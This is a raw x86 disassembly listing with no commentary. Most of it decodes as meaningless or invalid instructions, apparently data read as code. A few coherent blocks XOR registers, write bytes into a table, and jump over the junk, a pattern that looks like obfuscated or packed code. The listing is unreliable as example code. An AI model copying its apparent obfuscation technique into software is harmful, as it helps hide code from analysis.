  412d1c:	push   es
  412d1d:	dec    edx
  412d1e:	clc    
  412d1f:	jb     0x412cc8
  412d21:	sbb    al,0xd5
  412d23:	nop
  412d24:	inc    ebx
  412d25:	ret    
  412d26:	cwde   
  412d27:	add    ebx,edi
  412d29:	outs   dx,BYTE PTR ds:[esi]
  412d2a:	mov    edx,0xd7ece461
  412d2f:	loop   0x412d51
  412d31:	fwait
  412d32:	lods   al,BYTE PTR ds:[esi]
  412d33:	sbb    dl,BYTE PTR [ebp+0x41]
  412d36:	fucomi st,st(7)
  412d38:	inc    ebp
  412d39:	sbb    BYTE PTR [ebx+0x7d],dl
  412d3c:	arpl   WORD PTR [eax],bp
  412d3e:	push   esp
  412d3f:	adc    ch,BYTE PTR [ebx+0x2312edf]
  412d45:	sub    DWORD PTR ds:0xd2e42c52,esp
  412d4b:	scas   al,BYTE PTR es:[edi]
  412d4c:	test   BYTE PTR [ebp-0x613760fa],dl
  412d52:	stc    
  412d53:	add    al,0xae
  412d55:	jns    0x412d73
  412d57:	hlt    
  412d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d59:	pop    edi
  412d5a:	inc    eax
  412d5b:	inc    edx
  412d5c:	fs mov ah,0xc7
  412d5f:	(bad)  
  412d61:	or     DWORD PTR [esi],esi
  412d63:	cmc    
  412d64:	or     BYTE PTR [ebx+0x25230bf8],al
  412d6a:	rcl    DWORD PTR ss:[ebx-0x78],0x1e
  412d6f:	mov    ch,0x14
  412d71:	test   BYTE PTR [esi],al
  412d73:	inc    esi
  412d74:	mov    ch,0xe2
  412d76:	and    edi,DWORD PTR [eax]
  412d78:	je     0x412d5d
  412d7a:	push   esi
  412d7b:	inc    esp
  412d7c:	dec    edi
  412d7d:	cli    
  412d7e:	sbb    ch,BYTE PTR [ebx+0x377dcb31]
  412d84:	nop
  412d85:	mov    al,0x3
  412d87:	mov    ds:0xb98028c1,eax
  412d8c:	push   esp
  412d8d:	xor    DWORD PTR [esi-0x45c9a5be],ebx
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	das    
  412d95:	fnstsw WORD PTR [eax+0x29]
  412d98:	das    
  412d99:	cdq    
  412d9a:	es xchg ebx,eax
  412d9c:	mov    bl,0x1d
  412d9e:	in     eax,0x18
  412da0:	adc    al,0xfc
  412da2:	daa    
  412da3:	(bad)  
  412da4:	addr16 or eax,0xe0342245
  412daa:	pop    ebp
  412dab:	sub    ebp,DWORD PTR [ecx]
  412dad:	add    BYTE PTR [edx+esi*1-0x6a95a68e],cl
  412db4:	adc    ebx,edi
  412db6:	arpl   WORD PTR [ecx+0x1728595d],sp
  412dbc:	pop    esi
  412dbd:	or     ebx,0x8f158076
  412dc3:	dec    edi
  412dc4:	and    bh,bl
  412dc6:	sti    
  412dc7:	(bad)  
  412dc8:	aas    
  412dc9:	sbb    al,0x1b
  412dcb:	sub    al,0xa5
  412dcd:	stos   BYTE PTR es:[edi],al
  412dce:	sub    eax,0xa6971217
  412dd3:	adc    al,0xa6
  412dd5:	mov    bh,0xf4
  412dd7:	adc    esi,0xfffffff9
  412dda:	mov    bl,0xe8
  412ddc:	jg     0x412dd6
  412dde:	mov    dl,0x1c
  412de0:	pop    esi
  412de1:	adc    ch,BYTE PTR [edx-0x70]
  412de4:	je     0x412e36
  412de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412de7:	add    DWORD PTR [edx],esp
  412de9:	jle    0x412de9
  412deb:	xchg   ebp,eax
  412dec:	inc    ecx
  412ded:	cdq    
  412dee:	push   eax
  412def:	sbb    eax,0x5f3adcdf
  412df4:	jle    0x412e57
  412df6:	clc    
  412df7:	retf   0x3a1b
  412dfa:	add    DWORD PTR [ebp-0x764f6f7a],ecx
  412e00:	stc    
  412e01:	mov    bh,BYTE PTR [ecx-0x29e928bb]
  412e07:	cld    
  412e08:	dec    ecx
  412e09:	push   ss
  412e0a:	cdq    
  412e0b:	xchg   BYTE PTR [ecx+ebp*4+0x642136f4],bh
  412e12:	adc    bl,BYTE PTR [ebp+0x6a093095]
  412e18:	call   0x5cf2:0xa738cdc5
  412e1f:	cmp    al,0x4d
  412e21:	adc    al,0x76
  412e23:	imul   eax,DWORD PTR [eax],0xffffffae
  412e26:	mov    WORD PTR [edx+0x4aa7ddf4],ax
  412e2d:	repnz sub BYTE PTR [edx],ch
  412e30:	push   edi
  412e31:	mov    bh,BYTE PTR ds:0xbf04a5d8
  412e37:	push   0xffffffb9
  412e39:	mov    ecx,0x7d17fcf6
  412e3e:	sbb    BYTE PTR [esi],ah
  412e40:	jp     0x412e52
  412e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e43:	jecxz  0x412e48
  412e45:	mov    eax,ds:0xa81a34aa
  412e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e4b:	and    edi,DWORD PTR [eax-0x3c6e9d1c]
  412e51:	inc    eax
  412e52:	(bad)  
  412e53:	iret   
  412e54:	retf   0xe73c
  412e57:	sub    ch,bh
  412e59:	pop    esp
  412e5a:	aad    0xad
  412e5c:	(bad)  
  412e5d:	fbld   TBYTE PTR [eax-0x1eeb91d0]
  412e63:	fsub   QWORD PTR [esp+edx*4-0x59]
  412e67:	xor    eax,0x66c135dc
  412e6c:	xchg   edi,eax
  412e6d:	test   al,0xf7
  412e6f:	inc    ebx
  412e70:	stos   BYTE PTR es:[edi],al
  412e71:	sbb    DWORD PTR [eax-0x7f],0x3
  412e75:	in     al,dx
  412e76:	mov    ah,0x45
  412e78:	mov    edi,0x6fb85d0b
  412e7d:	push   ds
  412e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e7f:	jg     0x412eab
  412e81:	push   ecx
  412e82:	cwde   
  412e83:	fwait
  412e84:	cdq    
  412e85:	xchg   esp,eax
  412e86:	xchg   BYTE PTR [edx-0x7bef3728],dh
  412e8c:	es lock mov dl,ah
  412e90:	jmp    0x77d5:0x7c6ef8b4
  412e97:	adc    edx,DWORD PTR [ebp-0x22328ca1]
  412e9d:	push   esp
  412e9e:	xchg   ecx,eax
  412e9f:	into   
  412ea0:	cld    
  412ea1:	and    cl,dl
  412ea3:	inc    esi
  412ea4:	adc    DWORD PTR [edx-0x48],edi
  412ea7:	scas   al,BYTE PTR es:[edi]
  412ea8:	stos   DWORD PTR es:[edi],eax
  412ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eaa:	xchg   edi,eax
  412eab:	xor    BYTE PTR [eax+0x17],dl
  412eae:	lds    edi,FWORD PTR [ebx+0x70]
  412eb1:	mov    ebx,DWORD PTR [ebp+0x6a]
  412eb4:	push   cs
  412eb5:	dec    BYTE PTR [ebx+eax*4]
  412eb8:	pop    esp
  412eb9:	jne    0x412e8a
  412ebb:	(bad)  
  412ebc:	jmp    0x412e91
  412ebe:	or     BYTE PTR [ebx],0x41
  412ec1:	dec    edx
  412ec2:	and    al,0xc8
  412ec4:	clc    
  412ec5:	leave  
  412ec6:	arpl   sp,cx
  412ec8:	xor    ebx,DWORD PTR [ebx]
  412eca:	mov    edi,DWORD PTR [edx-0x528c9506]
  412ed0:	inc    si
  412ed2:	add    ebx,DWORD PTR [edx+ebx*1+0x428bf496]
  412ed9:	jae    0x412e5f
  412edb:	jmp    0x412e65
  412edd:	inc    edi
  412ede:	pop    eax
  412edf:	enter  0xf2de,0xdd
  412ee3:	sub    ebp,ebx
  412ee5:	jmp    0x36b2:0x2b6daac5
  412eec:	popa   
  412eed:	mov    bh,0x7b
  412eef:	xchg   ecx,eax
  412ef0:	retf   
  412ef1:	mov    ch,0xd4
  412ef3:	(bad)  
  412ef4:	out    0xec,al
  412ef6:	mov    ah,0xb1
  412ef8:	ror    DWORD PTR [eax+0x558b0f55],1
  412efe:	hlt    
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x3f
  412f26:	inc    esp
  412f27:	cmp    bl,BYTE PTR [eax+0x69]
  412f2a:	jne    0x412fa4
  412f2c:	js     0x412f13
  412f2e:	jle    0x412fa8
  412f30:	js     0x412f37
  412f32:	(bad)  
  412f33:	push   0xffffffb7
  412f35:	mov    ah,0x73
  412f37:	dec    edi
  412f38:	aaa    
  412f39:	fld    DWORD PTR [esi+0x15]
  412f3c:	aaa    
  412f3d:	mov    al,0xe4
  412f3f:	sub    dh,BYTE PTR [ebx]
  412f41:	inc    eax
  412f42:	sub    eax,0x20937769
  412f47:	jmp    0x1a14:0x6e646a6c
  412f4e:	add    DWORD PTR ds:[ebp+ecx*4-0x72],ecx
  412f53:	xlat   BYTE PTR ds:[ebx]
  412f54:	mov    ebp,0x23eac5b5
  412f59:	sbb    al,0x21
  412f5b:	jp     0x412fbf
  412f5d:	jle    0x412f6c
  412f5f:	sbb    al,0xa8
  412f61:	es add ch,bl
  412f64:	inc    ebp
  412f65:	mov    edx,0xf999ee96
  412f6a:	ror    BYTE PTR [ecx],0x6c
  412f6d:	pushf  
  412f6e:	mov    DWORD PTR [ebp+ebp*4-0x6c],esp
  412f72:	sbb    cl,BYTE PTR [edi]
  412f74:	dec    edi
  412f75:	lods   al,BYTE PTR gs:[esi]
  412f77:	pop    esi
  412f78:	lds    edx,FWORD PTR [edi]
  412f7a:	outs   dx,DWORD PTR ds:[esi]
  412f7b:	xor    cl,BYTE PTR ds:0x38db8790
  412f81:	lods   al,BYTE PTR ds:[esi]
  412f82:	cdq    
  412f83:	or     BYTE PTR [edx+0x6],al
  412f86:	lods   eax,DWORD PTR ds:[esi]
  412f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f88:	sahf   
  412f89:	cdq    
  412f8a:	in     al,0xb2
  412f8c:	mov    eax,0x2d5a5c6f
  412f91:	popa   
  412f92:	push   0x6f
  412f94:	retf   0xf948
  412f97:	cmp    ecx,DWORD PTR [eax]
  412f99:	or     DWORD PTR [edx-0x1e],edi
  412f9c:	push   ss
  412f9d:	sub    BYTE PTR [ecx+0x3313a181],0xc
  412fa4:	push   ebp
  412fa5:	mov    eax,ds:0xdcb9d566
  412faa:	enter  0xd23c,0x9
  412fae:	inc    edx
  412faf:	fdiv   st,st(6)
  412fb1:	lods   eax,DWORD PTR ds:[esi]
  412fb2:	int    0xb9
  412fb4:	rcl    DWORD PTR [ebx],cl
  412fb6:	add    edx,ebx
  412fb8:	jecxz  0x412f5d
  412fba:	sbb    DWORD PTR [edx-0x5b],esp
  412fbd:	push   cs
  412fbe:	imul   BYTE PTR [edx]
  412fc0:	call   0x656b9323
  412fc5:	idiv   BYTE PTR [eax+0x3d]
  412fc8:	test   BYTE PTR [ecx+ecx*1-0x72bf5ffd],0x8b
  412fd0:	(bad)  
  412fd1:	sahf   
  412fd2:	sub    DWORD PTR [esi-0x10b9ee12],0xffffff93
  412fd9:	pop    esi
  412fda:	shl    DWORD PTR [ebx+0x5c],1
  412fdd:	adc    dh,BYTE PTR [ecx-0x42]
  412fe0:	leave  
  412fe1:	repz in al,dx
  412fe3:	push   0x8c46cbca
  412fe8:	sbb    bl,bh
  412fea:	imul   ebp,DWORD PTR [ebp+ecx*2-0x36],0xfffffffe
  412fef:	inc    ebp
  412ff0:	std    
  412ff1:	ret    0xbeed
  412ff4:	out    dx,al
  412ff5:	inc    ebx
  412ff6:	xchg   edi,eax
  412ff7:	mov    al,ds:0x334bc167
  412ffc:	sub    al,BYTE PTR [eax+0x774637c0]
  413002:	push   es
  413003:	clc    
  413004:	gs jbe 0x413040
  413007:	mov    ebp,0x778d4dc7
  41300c:	ja     0x412fbb
  41300e:	dec    eax
  41300f:	rcl    DWORD PTR [bp+si+0x6e2e],cl
  413014:	cmp    BYTE PTR [edi+eiz*4+0x3998b4f6],al
  41301b:	push   cs
  41301c:	push   cs
  41301d:	jle    0x412fd4
  41301f:	push   eax
  413020:	loopne 0x413058
  413022:	mov    BYTE PTR [edi],ch
  413024:	imul   esi,DWORD PTR [eax],0xffffff99
  413027:	and    al,0xfc
  413029:	in     eax,0xdc
  41302b:	arpl   WORD PTR [eax+0x2bcd28be],cx
  413031:	pop    edx
  413032:	out    dx,al
  413033:	in     eax,dx
  413034:	or     ecx,ecx
  413036:	mov    DWORD PTR [eax+0x20f3f272],ebp
  41303c:	cli    
  41303d:	pushf  
  41303e:	and    DWORD PTR [esi-0x3c8def4e],ebx
  413044:	mov    edi,0xa6bbfb07
  413049:	fbld   TBYTE PTR [eax-0x255eaddf]
  41304f:	fwait
  413050:	dec    ebp
  413051:	jae    0x413087
  413053:	gs jnp 0x413088
  413056:	out    dx,al
  413057:	imul   esp,DWORD PTR [edi+0x4427768a],0x643a81d2
  413061:	dec    esp
  413062:	scas   eax,DWORD PTR es:[edi]
  413063:	xchg   DWORD PTR [esp+edx*8-0x1baf4149],ebx
  41306a:	and    DWORD PTR [edx],eax
  41306c:	mov    bh,0x6a
  41306e:	mov    eax,0x25e76608
  413073:	sub    eax,0xd86c004e
  413078:	es sbb ecx,esp
  41307b:	jecxz  0x4130fc
  41307d:	push   es
  41307e:	mov    al,bl
  413080:	lock mov esp,0xe8e4031b
  413086:	mov    al,ds:0xd8ae6743
  41308b:	cli    
  41308c:	sbb    ebp,DWORD PTR [esi+0x4]
  41308f:	loop   0x4130cf
  413091:	loop   0x4130ae
  413093:	xchg   BYTE PTR [edx-0x26],ch
  413096:	lock inc edx
  413098:	or     al,0x6f
  41309a:	mov    ecx,0x336817fd
  41309f:	pop    ss
  4130a0:	dec    edi
  4130a1:	and    BYTE PTR [edi-0x4369d0dd],bl
  4130a7:	cmp    DWORD PTR [eax],esp
  4130a9:	ja     0x41306c
  4130ab:	call   0xed2b73db
  4130b0:	mov    WORD PTR [edx+0x439c965a],?
  4130b6:	cmp    DWORD PTR [edx-0x7e],esp
  4130b9:	sub    eax,0x3852b2b0
  4130be:	les    ebx,FWORD PTR [ecx-0x4a]
  4130c1:	add    eax,0x4e33d5f5
  4130c6:	add    esi,DWORD PTR [edi+0x3d7df7f7]
  4130cc:	mov    ah,BYTE PTR [esi+0x32]
  4130cf:	inc    ebp
  4130d0:	add    eax,0x7c050e9b
  4130d5:	adc    DWORD PTR [ebp+0xed9063b],0x32
  4130dc:	and    BYTE PTR [ebx],dl
  4130de:	mov    ebp,0x63275077
  4130e3:	rol    DWORD PTR es:[ebx+eiz*4+0x31],0x7
  4130e9:	push   ss
  4130ea:	mov    ds:0xa1c60d74,eax
  4130ef:	sub    al,0x4f
  4130f1:	mov    esi,0xc3a3a436
  4130f6:	or     eax,0xc959ed03
  4130fb:	not    DWORD PTR [edi]
  4130fd:	and    dl,BYTE PTR [edi]
  4130ff:	imul   edx,DWORD PTR [ebp+0x6],0x3d
  413103:	inc    esi
  413104:	es lock jmp 0xb7ec:0x1a0f3cdd
  41310d:	ss popf 
  41310f:	lock xchg ebp,eax
  413111:	jo     0x41317c
  413113:	mov    ds:0x386d5524,eax
  413118:	(bad)  
  413119:	jg     0x4130cf
  41311b:	and    eax,0x25d34910
  413120:	dec    esp
  413121:	pop    ebp
  413122:	mov    bl,0xcd
  413124:	jns    0x41313d
  413126:	aas    
  413127:	pop    esi
  413128:	mov    esi,DWORD PTR [edx+0xb]
  41312b:	xchg   DWORD PTR [esi+ebx*2+0x798e9478],edx
  413132:	hlt    
  413133:	sbb    al,ah
  413135:	xor    DWORD PTR [eax-0x17],edi
  413138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413139:	add    edi,edi
  41313b:	xchg   edi,eax
  41313c:	aas    
  41313d:	and    al,0xc3
  413140:	sbb    al,BYTE PTR [eax+0x7da8908]
  413146:	lea    ebp,[edi-0x2704e6c7]
  41314c:	sbb    eax,0xea2ffceb
  413151:	retf   
  413152:	sbb    ecx,ebx
  413154:	call   0xc9ebb7f1
  413159:	rol    BYTE PTR [ecx-0x6],1
  41315c:	imul   edi,DWORD PTR [ebx-0x25a94d4],0x69
  413163:	lahf   
  413164:	fist   DWORD PTR [ecx+0x11925d5d]
  41316a:	dec    ebx
  41316b:	popa   
  41316c:	jle    0x4131b3
  41316e:	jl     0x413180
  413170:	int3   
  413171:	dec    edx
  413172:	call   0xd9c8:0x5f84
  413178:	outs   dx,BYTE PTR ds:[esi]
  413179:	ins    BYTE PTR es:[edi],dx
  41317a:	mov    esp,0x75d05b63
  41317f:	cmc    
  413180:	dec    edi
  413181:	push   cs
  413182:	or     ecx,DWORD PTR [eax-0x84226c2]
  413188:	imul   esi,ecx,0x70fc2e62
  41318e:	fcomp  DWORD PTR [edi-0x64862bce]
  413194:	into   
  413195:	or     eax,0xc1b4416f
  41319a:	push   ecx
  41319b:	pop    ebx
  41319c:	mov    edi,DWORD PTR [ebp-0xc]
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	jmp    0x413212
  4131c9:	jmp    0xe578:0x787ad63c
  4131d0:	jle    0x41324a
  4131d2:	js     0x41319e
  4131d4:	retf   
  4131d5:	xor    dl,BYTE PTR [edi+eax*2]
  4131d8:	fwait
  4131d9:	je     0x413239
  4131db:	aad    0xfe
  4131dd:	push   eax
  4131de:	int    0x88
  4131e0:	xchg   BYTE PTR [edx-0x55271a28],al
  4131e6:	test   BYTE PTR [ebx],bl
  4131e8:	mov    al,ds:0xae56147
  4131ed:	ins    BYTE PTR es:[edi],dx
  4131ee:	add    dl,BYTE PTR [edi+0x27]
  4131f1:	imul   esi,esi,0x3dfc28b5
  4131f7:	mov    ss,WORD PTR [eax-0x2b]
  4131fa:	jle    0x413187
  4131fc:	jmp    0x1d167ec5
  413201:	stc    
  413202:	mov    dh,0xae
  413204:	inc    esp
  413205:	into   
  413206:	pop    ss
  413207:	xchg   ebp,eax
  413208:	lahf   
  413209:	jo     0x413202
  41320b:	popf   
  41320c:	adc    DWORD PTR [ebx-0x15],0xa6d1b1d8
  413213:	pop    eax
  413214:	ret    0xc3d1
  413217:	ds mov cl,BYTE PTR fs:[edi-0x2d542bd8]
  41321f:	(bad)  
  413220:	stc    
  413221:	shr    dh,0x27
  413224:	sub    BYTE PTR [esi],ah
  413226:	add    al,0xb4
  413229:	adc    BYTE PTR [edi+ebx*2-0xe],0xa0
  41322e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41322f:	mov    dl,0xc2
  413231:	xor    edx,ebx
  413233:	iret   
  413234:	or     bh,BYTE PTR [ecx+0x69]
  413237:	jg     0x41320e
  413239:	push   ebp
  41323a:	mov    edx,DWORD PTR [ebx]
  41323c:	jg     0x413216
  41323e:	fld    DWORD PTR [ebx-0x4ad38699]
  413244:	sbb    BYTE PTR [ecx+0x1e],al
  413247:	inc    eax
  413248:	jecxz  0x4131fd
  41324a:	adc    esi,ebx
  41324c:	jb     0x4131cf
  41324e:	xchg   ecx,eax
  41324f:	(bad)  
  413251:	mov    esi,0x946e113c
  413256:	arpl   dx,ax
  413258:	call   0xae35:0xcf6da39f
  41325f:	dec    esi
  413260:	in     eax,0x64
  413262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413263:	and    dl,BYTE PTR [ecx-0x650d9469]
  413269:	popa   
  41326a:	xor    al,0x1a
  41326c:	stc    
  41326d:	test   BYTE PTR [ecx+edx*1-0x3c],al
  413271:	push   esi
  413272:	or     al,0x9d
  413274:	out    0xf4,al
  413276:	idiv   DWORD PTR [edx+0x5b]
  413279:	loope  0x413242
  41327b:	fist   WORD PTR [esi]
  41327d:	xchg   ebx,eax
  41327e:	push   cs
  41327f:	jmp    DWORD PTR [ebp-0x55]
  413282:	mov    ah,0xb
  413284:	imul   edi,edx,0xffffffef
  413287:	fimul  WORD PTR [edi]
  41328a:	adc    DWORD PTR [eax],edi
  41328c:	test   DWORD PTR gs:[esi+0x26f3cb43],edi
  413293:	mov    DWORD PTR [ecx],esi
  413295:	dec    esi
  413296:	stc    
  413297:	and    eax,0x790402bd
  41329c:	mov    cl,0xf3
  41329e:	sbb    BYTE PTR [ebx],dl
  4132a0:	sbb    al,0x3
  4132a2:	out    dx,al
  4132a3:	xor    esi,esp
  4132a5:	adc    DWORD PTR [edx],esp
  4132a7:	gs out dx,al
  4132a9:	push   es
  4132aa:	cli    
  4132ab:	push   esi
  4132ac:	dec    ebx
  4132ad:	js     0x4132a9
  4132af:	cld    
  4132b0:	dec    edi
  4132b1:	loope  0x41324d
  4132b3:	sub    ch,0xc6
  4132b6:	repz pop es
  4132b8:	push   0x42291c2f
  4132bd:	cwde   
  4132be:	adc    dh,0x2b
  4132c1:	aad    0x10
  4132c3:	and    dl,0xb7
  4132c6:	shr    ch,0x2b
  4132c9:	inc    edi
  4132ca:	and    ebx,DWORD PTR [eax]
  4132cc:	push   ecx
  4132cd:	pop    edi
  4132ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132cf:	repz jle 0x413316
  4132d2:	popf   
  4132d3:	retf   
  4132d4:	test   BYTE PTR [ecx],0xc2
  4132d7:	xlat   BYTE PTR ds:[ebx]
  4132d8:	or     al,0x46
  4132da:	jbe    0x413293
  4132dc:	sti    
  4132dd:	inc    ebp
  4132de:	xor    bl,cl
  4132e0:	xor    esp,esi
  4132e2:	inc    ecx
  4132e3:	jg     0x41332b
  4132e5:	cdq    
  4132e6:	ss iret 
  4132e8:	push   ebx
  4132e9:	jmp    0x4132b9
  4132eb:	xchg   ebx,eax
  4132ec:	ss push 0xffffffd5
  4132ef:	jnp    0x41331c
  4132f1:	jp     0x413316
  4132f3:	push   cs
  4132f4:	jmp    0x3cce:0xb2758553
  4132fb:	xor    eax,0x480aca12
  413300:	mov    edi,0x6f0fbad
  413305:	add    edx,edi
  413307:	dec    ecx
  413308:	sub    eax,0x1d106457
  41330d:	sub    BYTE PTR [esi],bl
  41330f:	xor    bl,BYTE PTR [ecx]
  413311:	inc    ebx
  413312:	aaa    
  413313:	daa    
  413314:	inc    edx
  413315:	mov    dh,0x94
  413317:	cli    
  413318:	adc    al,0x32
  41331a:	iret   
  41331b:	cmp    BYTE PTR [edx],cl
  41331d:	and    al,0xca
  41331f:	fisub  DWORD PTR [edx-0x2063636c]
  413325:	(bad)  
  413326:	pop    ebx
  413327:	sti    
  413328:	cmp    ebp,DWORD PTR [edx+0x5096ebe4]
  41332e:	(bad)  
  41332f:	push   cs
  413330:	aad    0x3e
  413332:	cmp    DWORD PTR [eax],ebp
  413334:	jne    0x4132bd
  413336:	sti    
  413337:	aas    
  413338:	inc    eax
  413339:	nop
  41333a:	mov    esp,0xed5ab448
  41333f:	and    al,0x2c
  413341:	add    DWORD PTR [esi+0x31],esp
  413344:	aas    
  413345:	mov    WORD PTR [ebx+0x1f],es
  413348:	gs popf 
  41334a:	or     DWORD PTR [esp+ebx*1-0x5],edx
  41334e:	jmp    0x2cee6a40
  413353:	inc    eax
  413354:	(bad)  
  413355:	jmp    0x65bc7187
  41335a:	jmp    0x57e9:0xbe8d2944
  413361:	cmp    bl,ah
  413363:	sti    
  413364:	sbb    al,0x27
  413366:	jb     0x4132f1
  413368:	xchg   esp,eax
  413369:	sbb    DWORD PTR [ebx],ecx
  41336b:	push   ecx
  41336c:	xlat   BYTE PTR ds:[ebx]
  41336d:	cmp    ah,BYTE PTR [edx-0x4d2b10bf]
  413373:	outs   dx,BYTE PTR ds:[esi]
  413374:	ins    DWORD PTR es:[edi],dx
  413375:	pushf  
  413376:	ret    
  413377:	iret   
  413378:	jb     0x413364
  41337a:	mov    al,ds:0x1657cd3c
  41337f:	es inc ebp
  413381:	rcl    DWORD PTR [edi-0x2d29c5f],0x3c
  413388:	ss fucomp st(0)
  41338b:	jne    0x41331e
  41338d:	xor    eax,0x83fa871c
  413392:	jne    0x413380
  413394:	mov    cl,0xbb
  413396:	mov    ds:0x73db398b,al
  41339b:	dec    edx
  41339c:	push   eax
  41339d:	jl     0x41339a
  41339f:	inc    ebp
  4133a0:	pop    ecx
  4133a1:	dec    eax
  4133a2:	mov    esi,DWORD PTR [eax]
  4133a4:	adc    edx,DWORD PTR [ecx-0x17]
  4133a7:	sbb    eax,0x6b62af37
  4133ac:	jne    0x413339
  4133ae:	adc    al,0xe0
  4133b0:	bound  edx,QWORD PTR [ecx+0x74119cd5]
  4133b6:	out    dx,al
  4133b7:	xchg   ecx,eax
  4133b8:	in     eax,0x2c
  4133ba:	adc    bh,BYTE PTR [eax-0x12]
  4133bd:	mov    ds:0x17d03a51,al
  4133c2:	mov    esp,0x32aa8434
  4133c7:	std    
  4133c8:	mov    dl,0x34
  4133ca:	mov    ch,0x25
  4133cc:	dec    edi
  4133cd:	mov    edi,0x4ad818ab
  4133d2:	add    BYTE PTR [edx],dl
  4133d4:	inc    ebx
  4133d5:	mov    esi,DWORD PTR [esp+edx*8+0x60]
  4133d9:	pop    ss
  4133da:	mov    BYTE PTR [ecx],cl
  4133dc:	pop    esp
  4133dd:	adc    DWORD PTR [ebx-0x52d2a8b1],ebx
  4133e3:	mov    esi,0x72b17e7c
  4133e8:	jmp    0x413389
  4133ea:	rcl    BYTE PTR [edx+0x37135a08],cl
  4133f0:	jp     0x4133e3
  4133f2:	inc    esp
  4133f3:	movd   ebp,mm0
  4133f6:	push   ss
  4133f7:	add    eax,0xaa8f78df
  4133fc:	stos   DWORD PTR es:[edi],eax
  4133fd:	adc    al,BYTE PTR [ecx]
  4133ff:	(bad)  
  413400:	jmp    0xfe2c:0xe488d911
  413407:	xchg   esi,ecx
  413409:	inc    esp
  41340a:	push   edx
  41340b:	inc    ecx
  41340c:	or     eax,0xedaa29d7
  413411:	or     ebp,DWORD PTR ds:[ebp+0x65]
  413415:	int3   
  413416:	les    edx,FWORD PTR [edx]
  413418:	popf   
  413419:	call   0xd85d748c
  41341e:	inc    eax
  41341f:	(bad)  
  413420:	sbb    dh,BYTE PTR [eax-0xd26f643]
  413426:	push   ebx
  413427:	mov    cs,WORD PTR [edi]
  413429:	pop    edi
  41342a:	lea    ebx,[esi-0x6b1fbf30]
  413430:	ss inc edx
  413432:	in     eax,0xe2
  413434:	jmp    0x7e12:0xbeaa13e9
  41343b:	cmp    al,0xcc
  41343d:	cdq    
  41343e:	add    edi,DWORD PTR [ebp-0x14]
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x7d51055e
  41345f:	adc    eax,DWORD PTR [ebx+0x78]
  413462:	jg     0x4134dc
  413464:	in     eax,0x7e
  413466:	js     0x4134e0
  413468:	mov    edx,0x6b64e01b
  41346d:	xchg   esp,eax
  41346e:	push   0xb6643680
  413473:	xchg   esp,eax
  413474:	stos   BYTE PTR es:[edi],al
  413475:	cmp    ch,BYTE PTR [edi+0x1886d5e5]
  41347b:	imul   bx,WORD PTR [esi+eax*1-0x97e7765],0xaad0
  413485:	arpl   WORD PTR [edi],sp
  413487:	sti    
  413488:	repz fidivr DWORD PTR [si+0xa84]
  41348e:	jmp    0xecf8:0x749fd904
  413495:	cmc    
  413496:	fnstsw WORD PTR [edi-0x4ef451bf]
  41349c:	push   cs
  41349d:	rcl    BYTE PTR [esi],cl
  41349f:	ins    DWORD PTR es:[edi],dx
  4134a0:	out    dx,eax
  4134a1:	retf   0x72b6
  4134a4:	xor    ebp,ebp
  4134a6:	pop    es
  4134a7:	dec    esp
  4134a8:	retf   0xb11d
  4134ab:	js     0x41347c
  4134ad:	mov    esi,0xfcec3bcf
  4134b2:	(bad)  
  4134b3:	xchg   esi,eax
  4134b4:	or     esp,ebp
  4134b6:	mov    dh,0x54
  4134b8:	mov    al,BYTE PTR [edi]
  4134ba:	pop    ebp
  4134bb:	add    eax,0x4f2c0d15
  4134c0:	es jne 0x4134a5
  4134c3:	sbb    esi,DWORD PTR [eax-0x12c0f78b]
  4134c9:	mov    ah,0xd6
  4134cb:	push   ebx
  4134cc:	imul   edi,DWORD PTR [esi-0x17],0x5a2b21e6
  4134d3:	sti    
  4134d4:	jo     0x413500
  4134d6:	or     DWORD PTR [ecx-0x62],ecx
  4134d9:	mov    ds:0x23569fa7,eax
  4134de:	lds    edi,FWORD PTR ds:0xad7a76d6
  4134e4:	push   cs
  4134e5:	sub    esp,esi
  4134e7:	mov    ebx,eax
  4134e9:	(bad)  
  4134ea:	cmp    eax,0x219bb800
  4134ef:	xor    bh,BYTE PTR [edi]
  4134f1:	ror    BYTE PTR [edx-0x2e],0x8b
  4134f5:	cmc    
  4134f6:	jo     0x413577
  4134f8:	mov    WORD PTR [edi+esi*1],gs
  4134fb:	cmp    esp,esp
  4134fd:	mov    al,ds:0x108471fe
  413502:	lods   eax,DWORD PTR ds:[esi]
  413503:	inc    esi
  413504:	fdivrp st(0),st
  413506:	mov    ecx,DWORD PTR [edi+0x4]
  413509:	inc    eax
